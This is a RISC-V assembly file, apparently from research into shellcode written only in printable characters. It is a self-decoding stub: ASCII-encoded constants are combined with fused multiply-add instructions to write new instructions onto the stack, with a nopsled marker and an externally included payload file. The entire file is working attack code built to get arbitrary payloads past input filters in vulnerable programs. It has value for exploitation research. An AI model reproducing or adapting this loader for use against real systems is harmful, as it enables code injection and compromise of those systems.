/*#
 *# (c) 2018-2019 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

.global shellcode
shellcode:

.macro dangerous_nop2
    li t1,-2
.endm
.macro xp_fixup
    # n464:5 n448:15
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
.endm
.macro end_nopsled
    # len:0
.endm
step0:
    .word 0x2730276F
stage2_pool:
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4261447a6f314233 # 48 # ADD_3A
    .8byte 0x42627073717a5a42 # 56 # ADD_1B
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4261706e69633436 # 80 # ADD_2A
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4261447a31356775 # 104 # ADD_3B
    .8byte 0x413166346e514956 # 112 # MUL_2
    .8byte 0x426132356a4b6e31 # 120 # ADD_2B
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4131706f64596870 # 160 # MUL_4
    .8byte 0x4261336f596c5239 # 168 # ADD_4A
    .8byte 0x4131352778497450 # 176 # MUL_3
    .8byte 0x4131567a47714b4d # 184 # MUL_1
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4242424242424242
    .8byte 0x4131555555555555 # 240 # FIX
    .8byte 0x426358466535524c # 248 # ADD_1A
payload_pool:
    .include PAYLOAD_FILE
step1:
    sra s4, zero, s3
    sra sp, a4, s4
step2:
                     #Role [Can]
    fld fa0, 48(sp)  #ADD_3A [AM]
    fld fa2, 56(sp)  #ADD_1B [AM]
    fld fa4, 80(sp)  #ADD_2A [AM]
    fld fa6, 112(sp) #MUL_2 [ M]
    fld fs0, 120(sp) #ADD_2B [AM]
    fld fs2, 176(sp) #MUL_3 [ M]
    fld ft2, 184(sp) #MUL_1 [ M]
    fld ft4, 240(sp) #FIX [ M]
    fld ft6, 248(sp) #ADD_1A [AM]
step3:
    xp_fixup
step4:
.macro next_block
    .short 0x6141
.endm
.macro fblock op, dstr, mulr, addr, store_offset, round=rup
    fm\op\().d \dstr, \mulr, ft4, \addr, \round
    fsd \dstr, \store_offset(sp)
.endm
    fblock add, ft6, ft2, ft6, 1952
    fblock add, ft6, ft2, fa2, 1958
    fblock sub, ft6, fa6, fa4, 1964
    fblock sub, ft6, fa6, fs0, 1970
    next_block
    fld fa2, 104(a4) #ADD_3B [AM]
    fld fa4, 160(a4) #MUL_4 [AM]
    fld fa1, 168(a4) #ADD_4A [A ]
    fblock sub, ft6, fs2, fa0, 1960
    fblock sub, ft6, fs2, fa2, 1966
    fblock sub, ft6, fa4, fa1, 1970
step5:
    end_nopsled
step6:
    csrc mip,sp
